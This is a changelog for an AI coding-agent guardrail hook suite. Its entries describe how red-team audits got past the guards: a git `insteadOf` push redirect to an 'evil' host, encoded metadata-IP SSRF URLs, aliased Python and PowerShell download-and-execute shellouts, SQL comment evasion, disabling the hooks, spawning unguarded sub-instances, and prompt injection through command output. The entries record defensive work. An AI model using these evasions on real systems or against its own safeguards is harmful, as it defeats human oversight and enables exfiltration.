- [2.23.11] - 2026-07-26 — feat(coverage): **new `bash-injection-scanner` — scans Bash command output for prompt injection, closing a cross-channel-parity gap.** `prompt-injection-scanner` (matcher `mcp__,WebFetch,WebSearch,Read`) never sees Bash output — yet agents routinely pull untrusted text through Bash rather than the egress-gated WebFetch tool: `gh issue view`, `gh pr view`, `git log`, `npm view <pkg>`, raw `curl https://site`, `cat ./cloned-repo/README.md`. A poisoned issue body or README surfaced that way carries the same instruction-override payloads the sibling catches on every other channel — on the highest-traffic channel of all, unscanned. The new PostToolUse hook (matcher `Bash`, safe-mode floor) reuses the sibling's battle-tuned python panel verbatim (NFKC + Cyrillic/Greek homoglyph fold + the instruction-override / persona-hijack / token-injection / base64 / zero-width patterns) against `stdout`+`stderr`, and **warns** the model to treat the surfaced text as data, not instructions. Because it fires on *every* Bash call, a cheap single-`grep` seed-gate runs first — python only forks when the raw payload actually contains a seed token, keeping the common case (ordinary command output) off the hot path. Output capped at first+last 32KB. Advisory + fail-open; disable with `SUPERCHARGER_BASH_INJECTION_SCANNER=0`. Safe-mode hook count 34→**35**, full 125→**126**. +17 tests. Full suite 2014/0.

- [2.23.10] - 2026-07-23 — perf(harness-tamper-guard): **stop over-processing every Bash command run inside a "supercharger" directory.** The v2.23.6 fast-path gate matched the bare substring `*supercharger*` against the whole hook payload — which includes the `cwd` field — so every Bash call made from this repo or the install dir (`~/.claude/supercharger`) matched, defeating the early exit and paying the full parse + grep (~6ms/call: measured 17.9ms vs the 11ms floor). Tightened the token to the specific install-path forms actually targeted (`supercharger/hooks`, `.supercharger-disabled`, `.claude/supercharger`), which stay a fail-safe superset of every block pattern but no longer match a plain `claude-supercharger` cwd. Back to 11ms. Self-audit fix — the two Bash-channel hooks added this session (harness-tamper, cloud-cli) were checked against the hot-path floor that v2.23.2/.3 optimized; cloud-cli's fast-path was already clean. +1 regression test. Full suite 1996/0.

- [2.23.9] - 2026-07-23 — feat(coverage): **new `install-script-guard` — catches supply-chain persistence via manifest lifecycle scripts.** npm/pnpm/yarn/bun run `preinstall`/`install`/`postinstall`/`prepare`/`prepublish`/`prepack`/… automatically on the next `install` (locally, in CI, on a teammate's machine), and a Python `setup.py` executes arbitrary code at install time — so adding or changing one is a prime, easily-missed persistence vector. `lockfile-integrity-guard` guards the lockfile and `dep-vuln-scanner` audits installed deps; neither inspects manifest lifecycle fields (verified: no hook grepped `postinstall`). The new PreToolUse hook (matcher `Write,Edit,MultiEdit`, full-mode, sibling of the lockfile guard) **asks** when a `package.json`/`setup.py` edit **adds or changes** a lifecycle script, or introduces one whose command reaches the network or evals code (`curl`/`wget`/`node -e`/`python -c`/`base64`/pipe/redirect). A brand-new manifest with a *benign* script (e.g. `husky install`) is **not** flagged — only suspicious commands or add/change-to-existing trigger it, keeping scaffolding quiet. Advisory + fail-open; disable with `SUPERCHARGER_INSTALL_SCRIPT_GUARD=0`. Full-mode hook count 124→**125**. +10 tests. Full suite 1995/0.

- [2.23.8] - 2026-07-23 — fix(tests): **the test suite no longer pops real desktop notifications.** Running the suite fired live macOS/Linux notifications on the developer's screen — e.g. *"Claude — Blocked credential request / Elicitation guard"* — because hook tests that exercise a block path (elicitation-guard and others) call the real `_send_notification`, and the test sandbox has no `.no-desktop-notify` file. Added a single choke-point guard: `_send_notification` returns early when `SUPERCHARGER_NO_NOTIFY` is set, and `tests/run.sh` exports `SUPERCHARGER_NO_NOTIFY=1` suite-wide. The two notify test files (`test-notify-helper`, `test-notify-events`) `unset` it so they still exercise the (mocked / sound-only) send path. Doubles as a general user kill-switch for desktop notifications. +1 test. Full suite 1984/0.

- [2.23.7] - 2026-07-23 — feat(coverage): **new `cloud-cli-destructive-guard` — Bash-channel parity with `mcp-destructive-guard`.** `mcp-destructive-guard` (v2.22.14) asks before a destructive infra op on an MCP provider server (`mcp__aws__`/`gcloud`/`azure`/`k8s`/…); the **same operations run through the native CLI** (`aws`, `gcloud`, `az`, `kubectl`, `helm`, `gsutil`, `doctl`, `flyctl`) on the Bash channel, where `safety.sh` only guards cloud **credential-theft / container-escape / RBAC** — not bulk deletes. So `aws ec2 terminate-instances`, `aws rds delete-db-instance`, `aws s3 rm --recursive`, `az group delete`, `kubectl delete namespace`/`--all`, `helm uninstall`, `gsutil rm -r`, `gcloud … delete`, `gcloud projects delete`, `flyctl destroy` slipped through. The new PreToolUse hook (matcher `Bash`, safe-mode floor) **asks** on those — mirroring the MCP channel's ask model (not a hard block, since cloud teardown is often legitimate). Reads/list/describe/`cp` don't match; raw-input fast-path exits before the parse on every non-cloud command. (`terraform`/`tofu destroy` is already blocked by `safety.sh`, so it's intentionally not duplicated here.) Advisory + fail-open; disable with `SUPERCHARGER_CLOUD_CLI_GUARD=0`. Full-mode hook count 123→**124**. +22 tests. Full suite 1982/0.

- [2.23.6] - 2026-07-23 — feat(coverage): **new `harness-tamper-guard` — Bash-channel self-defense against disabling the guardrail layer.** `path-guard` protects `.claude/settings.json` + hooks on the Write/Edit channel, and `safety.sh`'s `selfmod` category already blocks Bash edits to the config *files* (`settings.json`/`.supercharger.json`/`.disabled-hooks`/…) — but two Bash-channel gaps remained: **(1)** `claude --dangerously-skip-permissions` / `--permission-mode bypassPermissions` spawns an *unguarded* sub-instance, and **(2)** `rm`/`mv`/`chmod -x`/`truncate`/`touch`/redirect against the hook *scripts*, the install dir, the plugin hooks dir, or the `.supercharger-disabled` kill-switch tears the layer down — none of which the selfmod *filename* list covers. The new PreToolUse hook (matcher `Bash`, safe-mode floor) **denies** both. Scoped to installed locations (`.claude/…`, `…/supercharger/…`) so a repo-relative `chmod +x hooks/foo.sh` during development, `update.sh`, `sc-toggle.sh off`, and reads/listing all pass. Raw-input fast-path → exits before the parse on every non-matching command. Fail-open; disable with `SUPERCHARGER_HARNESS_TAMPER_GUARD=0`. Closes the [[cross-channel-parity-drift]] gap for the harness's own integrity. Full-mode hook count 122→**123**. +17 tests. Full suite 1960/0.

- [2.23.5] - 2026-07-23 — feat(coverage): **new `notebook-exec-guard` — closes the Jupyter-cell shell-exec bypass.** A notebook cell runs through the kernel, not the shell, so a cell that shells out — `!rm -rf …`, a `%%bash` cell body, `%pip`/`!pip install …`, `os.system(…)`, `subprocess.run([…])` — **never passes the `Bash` matcher**, and `safety.sh` / `git-safety` / `enforce-pkg-manager` never see it. `code-security-scanner` already runs on `NotebookEdit` but only flags generic patterns (eval/pickle/md5/…) — it has zero shell-magic detection. The new PreToolUse hook (matcher `NotebookEdit`, safe-mode floor) extracts the shell content from the edited cell and **routes it through `safety.sh`** — so it inherits the exact same destructive/network/credential rules with **no pattern drift** (relays a deny verbatim) — and **asks** on a package install in a cell. Benign shell (`!echo`, `rm -rf /tmp/scratch`) passes, exactly as it would on the Bash channel (parity by construction). Advisory + fail-open; disable with `SUPERCHARGER_NOTEBOOK_EXEC_GUARD=0`. Full-mode hook count 121→**122**. +12 tests. Full suite 1942/0.

- [2.23.4] - 2026-07-23 — feat(coverage): **new `test-integrity-guard` — asks before an edit games the Verification Gate.** Supercharger's core promise is "run the tests, confirm they pass" — and the one way an agent defeats that is by editing the **tests** instead of fixing the code: adding skip/focus markers (`it.skip`, `describe.only`, `xit`, `@pytest.mark.skip`/`skipif`, `@unittest.skip`, `@Ignore`/`@Disabled`, `t.Skip`, `#[ignore]`, `.only(`, `pending`) or deleting assertions so a broken suite goes green. The closest existing hooks — `lazy-refactor-check` (param→`_param`) and `comment-replacement-check` (code→comment) — inspect churn, not test semantics, so this was an open gap. The new PreToolUse hook (matcher `Edit,MultiEdit,Write`) gates on test-file conventions (`.test.`/`.spec.`/`_test.`/`test_*.py`/`__tests__/…`), diffs old→new (for `Write`, against the on-disk version — brand-new test authoring is not flagged), and **asks** the user to confirm when the edit removes assertions or introduces skip/only markers. Advisory + fail-open; disable with `SUPERCHARGER_TEST_INTEGRITY_GUARD=0`. Full-mode hook count 120→**121**. +14 tests. Full suite 1929/0.

- [2.23.3] - 2026-07-23 — perf(session-checkpoint): **debounce the per-write crash-recovery snapshot — the top reducible hook cost in real timing.** `session-checkpoint` fires on every `Write`/`Edit`/`Bash` and spends ~100ms/call, almost all of it in 3 git child processes (branch + 3× diff/ls-files for the modified-file list). The checkpoint is a **full idempotent snapshot** (not incremental), so a skipped write loses nothing — the next write captures fresh state and git itself still holds the true file list. Added a **debounce** (default 10s, keyed per-session, fork-free session-id extraction) that short-circuits before the python+git forks; measured **100ms→14ms** on skipped calls. Zero correctness risk (unlike the v2.23.2 budget-cap walk there is no deferred state). Disable with `SUPERCHARGER_CHECKPOINT_DEBOUNCE_SECS=0`. Note: the earlier `/perf` table over-reported this hook at 356ms — that number is inflated by the bash-3.2 profiling instrumentation's own python fork; the independently-measured cost is ~100ms. +3 tests. Full suite 1914/0.

- [2.23.2] - 2026-07-23 — perf(budget-cap): **cut the single largest hook cost — the per-PostToolUse transcript walk.** Profiling on real sessions put `budget-cap` at ~237ms/call and ~65s cumulative — the top hook by total overhead — because its accumulate mode forks python (cold-start ~40-70ms) plus a `jq` (transcript_path) + `jq`+`tr`+`head` (session_id) + `date -u` helper chain on **every** tool call. Two changes, no behavior loss: **(A)** the three helper forks are folded away — `transcript_path`/`session_id` are now extracted fork-free in bash (jq fallback only if the compact-JSON fast-parse misses) and the timestamp is computed inside the existing python fork; **(C)** the walk is **debounced** (default 4s, keyed per-transcript). The walk resumes from a persisted per-transcript byte offset (incremental + additive), so a debounced call defers — never drops — its tokens; the next walk picks them up. Measured 49ms→15ms on skipped calls locally (larger in prod where real transcripts dominate the walk). Enforcement freshness lags at most one window; set `SUPERCHARGER_BUDGET_DEBOUNCE_SECS=0` for exact per-call accounting under a tight cap. Correctness-critical hook (long over-count bug history) — pinned by +4 new debounce tests plus the full existing accounting suite. Full suite 1911/0.

- [2.23.1] - 2026-07-23 — feat(discoverability): **a one-time PreCompact nudge points users at `/handoff`.** Users know `/compact`; most don't know `/handoff` exists — so the 2.23.0 auto-load only helped the few who already ran it. `compaction-backup.sh` (PreCompact) now emits a **one-time-per-project** stderr hint at the exact moment a richer resume brief pays off: *"run /handoff before you stop — it writes a fuller resume brief that auto-loads after this compaction and in your next session."* Zero context tokens (stderr only), deduped by a per-project flag. **Skipped** when a fresh (<7d) `.claude/handoff.md` already exists (they know the feature), when `SUPERCHARGER_NO_MEMORY=1`, or via the kill switch `SUPERCHARGER_HANDOFF_NUDGE=0`. Same harness-layer discoverability-nudge pattern as the slow-typecheck hint — no orchestration, no new hook. +3 tests. Full suite 1907/0.

- [2.23.0] - 2026-07-23 — feat(resume): **the `/handoff` brief now auto-loads across both the compaction and session boundaries — no more re-explaining a shifted session.** Previously the rich `/handoff` narrative (Done / Decisions / What-failed / Resume-with) was written to `.claude/handoff.md` but only re-entered context if you pasted it back by hand; the two injectors read only the mechanical `supercharger-memory.md`. Now `post-compact-inject.sh` (PostCompact) appends the handoff brief after the compaction summary — no freshness gate, since compaction is the same session — and `session-memory-inject.sh` (SessionStart) injects it in **every** path (no-memory-file, branch-changed stub, no-open-work stub, and full-memory), **freshness-gated to 7 days** so a stale brief never floods a much-later session. Both cap the brief at 2500 chars. A shell hook still can't *author* the narrative (only the model can, via `/handoff`), but once written it round-trips automatically. No new hook; two existing hooks edited. +4 tests. Full suite 1904/0.

- [2.22.14] - 2026-07-22 — feat(coverage): **new `mcp-destructive-guard` — asks before destructive infra/filesystem/git MCP operations.** These MCP servers act through **structured tool calls, not a shell command string**, so `safety.sh` (Bash), `git-safety` (`git *`), and `path-guard` (Write/Edit) never saw them — a delete of a cloud resource, a k8s namespace drop, `docker prune`, a filesystem `delete_file`/`move`, or a git hard-reset/force-push ran unguarded. The new PreToolUse hook matches `mcp__filesystem__`/`aws`/`kubernetes`/`k8s`/`docker`/`gcloud`/`gcp`/`azure`/`git`/`terraform` and **asks** (user confirms) when the tool name carries an unambiguous destructive verb (`delete`/`remove`/`terminate`/`destroy`/`prune`/`drop`/`erase`/`wipe`/`flush`/`purge`/`teardown`/`deprovision`/`force-push`/`hard-reset`) — a bare git `reset` (soft) and read/list ops are **not** asked. Advisory + fail-open; kill switch `SUPERCHARGER_MCP_DESTRUCTIVE_GUARD=0`. Full-mode hook count 119→**120**. +13 tests. Full suite 1900/0. — With this the adversarial-audit coverage gaps are closed (shell-exec MCP → 2.22.12, browser MCP → 2.22.13, PowerShell → 2.22.11, MultiEdit → 2.22.6).

- [2.22.13] - 2026-07-22 — fix(coverage): **browser-MCP SSRF/eval guard broadened beyond playwright/puppeteer.** `mcp-playwright-guard` (navigate SSRF + in-browser-eval RCE) covered only `mcp__playwright__`/`mcp__puppeteer__` — the same surface exists on `browserbase`, `browser-use`, `browsermcp`, `chrome-devtools`, and `stagehand`, whose navigate/eval tools have different names and slipped both the matcher and the internal tool-name gate. Added those servers to the matcher (installer + plugin) and the gate, and broadened the eval/navigate tool-name globs (`*run_code*`/`*evaluate*`/`*run_js*`… and `*navigate*`/`*goto*`/`*open_url*`) so their navigation is SSRF-checked and their JS-eval tools are blocked. +7 tests. Full suite 1886/0.

- [2.22.12] - 2026-07-22 — fix(coverage): **shell-exec MCP servers routed through safety.sh.** Popular MCP servers that execute arbitrary OS commands — `desktop-commander` (execute_command), `mcp-server-commands`, `iterm`, `ssh`, `shell`, `terminal`, `windows-cli`, `cli-mcp-server` — sent their command strings through the `mcp__` channel, which never reached `safety.sh`, so destructive deletes, remote-fetch-to-shell, DB drops, and persistence were **unguarded** there (generic `mcp__` coverage only inspects URLs/secrets/output, not command intent). Added those servers to `safety.sh`'s matcher and broadened its extraction to `.cmd` (shell MCPs vary the arg name), so their commands now get the exact same dangerous-pattern block as native Bash — a prompt-injected instruction executed via a shell MCP is caught. +6 tests (MCP destructive/remote-exec blocked; `.cmd` field scanned; benign MCP command allowed; registration parity). Full suite 1879/0.

- [2.22.11] - 2026-07-22 — fix(coverage): **PowerShell command bodies are now inspected.** `safety.sh` is registered for `Bash,PowerShell`, but every pattern was unix-oriented and it read only `.tool_input.command` — so PowerShell-native attacks were **entirely unguarded** (name-matched, not body-inspected). Added a PowerShell pattern set — recursive/force delete (`Remove-Item -Recurse -Force`), arbitrary code exec (`Invoke-Expression`/`iex`), remote-fetch-to-exec (`(New-Object Net.WebClient).DownloadString`, `Invoke-WebRequest`/`Invoke-RestMethod -OutFile` and `… | iex`), execution-policy bypass, base64 `-EncodedCommand`, and stealth launch (`-NoProfile -WindowStyle Hidden`) — matched case-insensitively and specific enough not to fire on Bash. Also broadened the command extraction to read `.script`/`.code` (not just `.command`), so the body is scanned regardless of the PowerShell tool's field name. Gated under the destructive/network categories. +10 tests (PS attacks blocked; benign PowerShell and Bash unaffected; `.script` field scanned). Full suite 1873/0.

- [2.22.10] - 2026-07-22 — fix(security): **redirect-clobber catches `1>` and `>|`.** The truncating-redirect detector excluded a leading fd digit and didn't handle the clobber-force `>|`, so `echo x 1> tracked.ts` and `echo x >| tracked.ts` slipped the "prefer Edit/Write" ask. Now an fd-qualified truncate (`1>`) and `>|` are detected, while append (`>>`) and fd-dup (`>&`/`2>&1`) stay excluded (and only git-tracked targets are ever surfaced). +4 tests. Full suite 1863/0. — Two audit LOWs are **intentionally deferred** with rationale: the `0x`+64-hex Ethereum-key false-positive (requiring a nearby key label would *reduce* detection of bare wallet keys — a coverage cut, not a win, for a scanner) and the `rm / -rf` flag-reorder (`rm / -rf`) which GNU `--preserve-root` blocks by default and which BSD/macOS doesn't permit via option-after-operand; both tracked in memory.

- [2.22.9] - 2026-07-22 — fix(security): **elicitation-guard scans field description/title values.** `elicitation-guard` checked field *names* and the top-level message, but skipped the string *values* of `description`/`title` (they're JSON-Schema meta keys, so `collect_keys` ignored them). An untrusted MCP server could use a benign field name (`value`) and put the credential ask in the field's **description** ("Paste your production database password here"), evading both `cred_fields` and the message check → the user sees a routine-looking prompt harvesting a secret. Now the phishing regex also runs on `description`/`title`/`examples` string values throughout the schema. +4 tests (description- and title-hidden asks declined; benign description allowed; field-name detection intact). Full suite 1859/0.

- [2.22.8] - 2026-07-22 — fix(security): **safety-detect catches aliased/indirect `os` shellout.** The interpreter-shellout detector matched `\bos\.system\b` and a bare `system(`, so a trivially-aliased call — `python3 -c "import os as o; o.system('id')"`, `__import__('os').system(…)`, or `getattr(os,'system')(…)` — evaded it (the dot-prefixed `.system(` was excluded by the bare-`system(` pattern's `[^\w.]` guard). Added patterns for `.system(`/`.popen(` on **any** object plus the `getattr(os,'…')` indirection form, so an interpreter one-liner that shells out via an alias is detected. Destructive inner commands (`rm`/`dd`) were already caught by the wrapper-destruct list; this closes the generic-shellout/exfil launcher. +6 tests (aliased/`__import__`/`getattr` blocked; direct form still blocked; benign one-liners allowed). Full suite 1855/0.

- [2.22.7] - 2026-07-22 — fix(security+ci): **tool-call-limiter is per-session again; egress-comment CI fix.** (1) `tool-call-limiter` keyed its counter on the env var `CLAUDE_SESSION_ID`, which Claude Code doesn't set (it delivers `session_id` in the hook payload), so `SESSION_KEY` fell back to the calendar date — making the "per-session" cap a **per-day, machine-global** counter: one busy session could drive the shared daily count over the cap and **block every other concurrent session's** Edit/Write/Bash, and the limit reset at midnight. It now reads `session_id` from the payload like every sibling hook (env/date only as a last-resort fallback). (2) CI hotfix: a v2.22.5 comment inside `webfetch-egress-guard`'s `python3 -c "…"` string contained back-ticked text that shellcheck (correctly) flagged as command substitution (SC2287) and that also ran as a stray sub-shell at hook time; reworded. `shellcheck --severity=error` is now clean across all `.sh`. +3 tests. Full suite 1849/0.

- [2.22.6] - 2026-07-22 — fix(coverage): **MultiEdit now scanned by memory-write-guard and code-security-scanner.** Both hooks matched only `Write,Edit` (+`NotebookEdit` for the scanner) and read content from `.content`/`.new_string`, so a **MultiEdit** — whose content lives in `.edits[].new_string` — bypassed both. That let an agent **poison persistent memory** (auto-loaded every SessionStart) or introduce insecure code (secrets/eval/weak-crypto) via MultiEdit while the same change through Edit was caught — a cross-channel-parity gap. Added `MultiEdit` to both matchers (installer + plugin registration) and taught both hooks to concatenate `edits[].new_string` as the scanned content. +6 tests (poisoned MultiEdit to a memory file blocked; MultiEdit `eval()` flagged; Edit regression intact; registration parity). Full suite 1848/0.

- [2.22.5] - 2026-07-22 — fix(security): **egress/SSRF encoding bypasses.** The red-team defeated the egress guards several ways; fixed across the shared lib + both guards + playwright. (1) **No percent-decoding** — the guards matched `blob.lower()` with no `urllib.unquote`, so a percent-encoded host/path (`http://%31%36%39.254.169.254/latest/%6d%65%74%61-data/`) defeated every host and path token even though the tool decodes before the request; both egress guards now decode (two rounds) before matching — the wholesale fix for the path-token bypass class. (2) **Metadata-IP encodings** — added Alibaba IMDS `100.100.100.200`, the IPv6-hextet spelling of `169.254.169.254` (`a9fe:a9fe`), and octal/hex-dotted + octal-dword forms to the metadata regex. (3) **playwright parity** — `browser_navigate` host-matched literally, so numeric-encoded metadata (`http://<dword>/`), numeric loopback (`2130706433`, bare `0`, `[::]`, expanded `[0:0:…:1]`), and the single-slash `file:/etc/passwd` (browsers normalize it to `file:///`) all slipped; added those forms. (4) **Exfil channels** — Slack Workflow-Builder webhooks (`/triggers/`, `/workflows/`), Telegram Bot API, `webhook.site`/requestbin/pipedream, and paste hosts `catbox.moe`/`rentry.co`/… added to the webhook/paste blocks. +12 tests. Full suite 1842/0.

- [2.22.4] - 2026-07-22 — fix(security): **human-approval gate — flagship commands now actually block, and prefixes no longer dodge it.** Two audit findings. (1) The default-enable list turns the gate **on** for `prisma migrate reset` / `drizzle-kit push --force` (named in the header as the whole reason the gate exists — "unrecoverable, documented real-world incidents"), but there was **no precise matcher** for them, so `MATCH_REASON` stayed empty and they passed with no prompt. Added a `migration` category so they are gated. (2) The `git` / `infra` / `publish` / `docker` / `disk` matchers were anchored to `^` (start of the whole command), so any leading token — `sudo terraform destroy`, `cd /x && kubectl delete namespace prod`, `FOO=1 npm publish`, `true && docker system prune` — meant the string no longer started with the tool name and the matcher missed. De-anchored to a statement boundary (`^`, whitespace, or `;`/`&`/`|`), which catches the prefixed/chained forms (the `sql` and `db` categories were already unanchored). +11 tests. Full suite 1830/0.

- [2.22.3] - 2026-07-22 — fix(security): **git force-push refspec + inline-config exfil.** Two audit findings. (1) **`HEAD:main` force-push** — the bare-branch protected check was space-anchored, so in `git push --force origin HEAD:main` the `main` (after a `:`) wasn't seen as protected; combined with the de-force rewrite firing only for a single command, `git fetch && git push --force origin HEAD:main` reached `main` unmodified. The protected-name match now also accepts a `:` boundary, so it is blocked (both single and compound). (2) **`git -c url.<X>.insteadOf` transport redirect** — git's inline config transparently rewrites the push URL at transport time, so `git -c url."https://evil/".insteadOf="https://github.com/" push origin main` silently pushes the whole repo to the attacker host while the remote-name check sees a trusted `origin` (the `-c` value was skipped as a global option). `lib-git-remote` now inspects inline `-c url.*.insteadOf`/`pushInsteadOf` and **asks** when it redirects a push to a foreign host. +6 tests. Full suite 1819/0.

- [2.22.2] - 2026-07-22 — fix(security): **safety.sh Bash-channel evasions.** The adversarial red-team found four ways to slip a dangerous command past `safety.sh`, all verified and fixed. (1) **`&` background operator** — the `bash -c` / `eval` / `source /dev/tcp` anchors were `(^|;|&&|\|\|)`, omitting a single `&`, so `x & bash -c '<anything destructive>'` ran completely unguarded (the per-segment `rm` check also splits on `&`, hiding the `rm` inside the `-c` body). Added `&` to the anchor. (2) **SQL `/**/` comment** — the DB patterns required literal whitespace between keywords, so `DROP/**/TABLE` / `TRUNCATE/**/…` / `DELETE/**/FROM` (valid SQL) evaded; the inter-keyword separator now also accepts a `/*…*/` comment. (3) **Shell-profile write** — a quote broke the contiguous redirect regex (`>> "$HOME/.bashrc"`, `>> ~/'.bashrc'`) and `cp`/`mv`/`install`/`rsync`/`dd` overwriting a profile wasn't checked at all; the redirect matcher is now quote-tolerant and a copy-verb arm was added. (4) **Self-modification via `rsync`** — the selfmod verb list (`sed -i`/`tee`/`mv`/`cp`/…) omitted `rsync`, so `rsync x ~/.claude/…/.disabled-security-categories` could install a guard-disabling file; `rsync` added. +14 tests (each evasion blocked; normal `cp`/compound/git still allowed). Full suite 1813/0.

- [2.22.1] - 2026-07-22 — fix(security): **path-guard case-insensitive-FS and symlink bypasses.** The adversarial audit proved (in a sandbox) two ways to defeat path-guard's write deny. (1) **Case-insensitive filesystem** (macOS APFS default): the git-internals, self-modification, and build-artifact checks matched **case-sensitively**, so `.GIT/config`, `.SUPERCHARGER.json`, `.CLAUDE/settings.json`, `.NEXT/…` all resolved to the real protected files but slipped the regex — an agent could clobber `.git/hooks/pre-commit` (code-exec on next git op) or rewrite `.supercharger.json` to turn off **every** security category. Fixed with `re.IGNORECASE` / case-folded basename comparison on those checks. (2) **Symlink redirection**: the absolute-path branch joined the basename **literally**, so an in-repo symlinked file (`innocent.json → ~/.ssh/authorized_keys`) escaped, and a dir-alias (`g → .git`, write `g/config`) reached git internals while the lexical matcher saw no `.git`. Now the symlink category resolves the **full** realpath and blocks a symlink-redirected write that lands outside the project or inside `.git/` — acting only when realpath actually differs from the lexical path, so plain absolute paths still defer to abs-path (with its safe-list + the Claude file-memory allowance, verified intact). +12 tests. Full suite 1799/0.

- [2.22.0] - 2026-07-22 — fix(security): **secret scanner now catches current-generation credential formats.** An adversarial audit found the shared `lib-secret-patterns.sh` set (used by output-secrets-scanner, prompt-secret-guard, commit-guard) **missed today's most common keys** — a serious gap for a secret scanner. Fixed, all verified: **OpenAI** modern `sk-proj-`/`sk-svcacct-`/`sk-admin-` and **Anthropic** `sk-ant-` (the `sk-[alnum]{20,}` run broke on the hyphen); **GitHub** fine-grained `github_pat_` and refresh `ghr_`; **lowercase `aws_secret_access_key`** (the canonical `~/.aws/credentials` / boto form — the pattern was upper-only, so the single most common on-disk AWS secret evaded); **`postgres://`/`redis://` URL creds containing an `s`** (the pattern used `\s` inside a `[…]` bracket, where it means the literal chars `\` and `s` on every grep — silently excluding the letter `s` from userinfo); the generic keyword set gained **`client_secret` / `secret_key` / `auth_token` / `private_token`** (OAuth `client_secret` is a very common real leak); and **Slack app-level `xapp-`**. One shared file → all three channels gain coverage at once. +15 tests (each modern format caught; existing formats + no-FP-on-prose regressions). Full suite 1787/0.

- [2.21.15] - 2026-07-22 — fix(isolation): **session-scope-leak sweep, part 2 — mcp-circuit-breaker + notify cooldowns.** Two more global-filename leaks across concurrent sessions. **mcp-circuit-breaker** keyed each server's health file on the server name alone (`.mcp-health/<server>`); the escalating cooldown is driven by **one** session's usage, so a single session tripping a 429 **denied every other concurrent session's calls to that server** (and reset their state). The health file is now keyed by `(server, session)`, so each session backs off on its own signal. **notify-helper** cooldown stamps (`.notify-ts-{stop,permission}`) were global, so one session's completion/permission notification suppressed another's within the window; `_cooldown_ok` takes an optional session id and `notify-stop`/`notify-permission` pass it (the machine-wide idle ping stays global, by design). +5 tests (breaker: session B not blocked by session A's 429; cooldown: session B not suppressed by session A, per-session stamp written). Full suite 1772/0.

- [2.21.14] - 2026-07-22 — fix(correctness): **repetition-detector no longer flags every 3rd Read as a loop.** The hook split its jq `@tsv` field line with `read` under `IFS=$'\t'`, but tab is an IFS-**whitespace** character, so `read` collapsed empty columns. For a Read tool (empty command column) that shifted `file_path`→`F_CMD` and `session_id`→`F_FPATH`, so the Read loop-fingerprint keyed on the **session id** instead of the file path — any 3 reads in a session produced a bogus `[LOOP] 'Read:<session-id>' repeated Nx — try different approach`. Now the tab delimiters are converted to a non-whitespace unit-separator (`\037`) before `read`, so empty columns survive and fields land in the right variables (`@tsv` has already escaped any literal tab/newline in the values, so it's lossless). Read loops now correctly key on the file path, and `session_id` reads directly (removing the separate `awk` extraction added in 2.21.12). Bash loop detection is unchanged. +4 tests (3 distinct reads don't loop; 3 reads of the same file do; bash loops still work; distinct commands don't). Full suite 1769/0.

- [2.21.13] - 2026-07-22 — fix(robustness): **tool-call-limiter quote-injection + rate-limit-advisor path/leak.** Two independent fixes. (1) **tool-call-limiter** read `maxToolCalls` by string-interpolating the project path into a python literal (`open('$SEARCH_DIR/.supercharger.json')`); a project dir containing a single quote (e.g. `o'malley`) broke the literal → `SyntaxError` → `CAP` empty → the limiter **silently disabled itself**. The path is now passed via an env var (`os.environ['SC_CFG']`). (2) **rate-limit-advisor** read `os.environ['SCOPE_DIR']` that bash never exported, so under the plugin runtime (state in `CLAUDE_PLUGIN_DATA`) it fell back to `~/.claude`, never found `.session-cost`, and the advisor **never fired**; and its 10-minute warn-dedup file was global, so one session's warn suppressed another's. Now `SCOPE_DIR` is exported and `.rate-limit-last-warn` is session-scoped. +4 tests. Full suite 1765/0.

- [2.21.12] - 2026-07-22 — fix(isolation): **session-scope-leak sweep — per-session state stops bleeding across concurrent sessions.** Three hooks wrote per-session state to **global** filenames, so two sessions running at once corrupted each other's signals: `cache-health` (`.cache-health-counter` / `.cache-health` rolling window / `.cache-health-dedup` — shared every-5th counter + mixed hit-rate windows → false "degraded" warnings or masked real degradation), `auto-compact` (`.compact-last-band` — one session at 85% suppressed another's 70/80 `/compact` nudge, and dropping below 70 reset the other's debounce), and `repetition-detector` (`.loop-history` — one session's fingerprints mixed into another's `tail -20` window → cross-session false-loop warnings). All three are now suffixed with the session id; `session-end` cleans them and `scope-cleanup` TTL-globs them. In `repetition-detector` the id is taken via `awk` field 5 (the `read`-with-`IFS=tab` path collapses the empty `file_path` column, so `read` can't be trusted for it), which also removed a redundant 3-fork re-extraction. +4 tests (each writes the `-<sid>` name not the global; session B does not inherit session A's loop history). Full suite 1761/0.

- [2.21.11] - 2026-07-22 — fix(correctness): **trace-compactor no longer hides the middle of arbitrary large output.** The hook's scope is Python/Node tracebacks, but its `else` branch silently rewrote **any** ≥2000-char Bash output to first-2000 + last-500 via `updatedToolOutput` — so a `cat bigfile`, a long log, or any large dump reached Claude with its **middle removed**, and Claude acted on it as if complete (the omission marker is easy to miss and the data is unrecoverable). `bash-output-compactor` already handles the specific verbose commands worth compacting (git log, test output); trace-compactor should stick to tracebacks. Generic truncation is now **opt-in** via `SUPERCHARGER_TRACE_COMPACT_GENERIC=1`; by default non-traceback output is left untouched. Traceback/Node-stack compaction is unchanged. +4 tests (traceback still compacts; generic output untouched by default; opt-in restores it; short output ignored). Full suite 1757/0.

- [2.21.10] - 2026-07-22 — fix(security): **git-safety `--force` push parity.** The protected-branch set diverged by push form: the leading-`+` refspec path protected `main|master|production|prod|release`, but the `--force`/`-f` path checked only `main|master`. So `git push --force origin production` was **not** blocked (it fell through to the de-force rewrite that merely strips the flag) while `git push origin +production` was. Aligned the bare-branch check to the same protected set, so a `--force`/`-f` push to `production`/`prod`/`release` is now blocked like the `+ref` form. Non-force pushes and non-protected branches are unaffected. +4 tests (`--force` to production and `-f` to release blocked; `--force` to a feature branch and a non-force push to production still allowed). Full suite 1753/0.

- [2.21.9] - 2026-07-22 — fix(config): **`/sc-update` no longer resets your MCP profile to `light`.** `update.sh` re-ran `install.sh` passing `--mode/--roles/--economy/--notify/--commits`, but **not** `--mcp-profile` — and `install.sh` defaults the profile to `light` and *unconditionally* overwrites `scope/.mcp-profile`. So any user who set `dev`/`research`/`full` lost it on **every** update (economy tier survived because it's detected and re-passed; the MCP profile had no such path). This is the same silent-config-reset class as the v2.10.2 notify-flag drift. Now `update.sh` detects the current profile from `scope/.mcp-profile` (default `light` if absent) and re-passes `--mcp-profile` on **both** install invocations (the `--check` fast-path and the main path). +2 tests (both invocations pass the flag; detection reads the existing file). Full suite 1749/0.

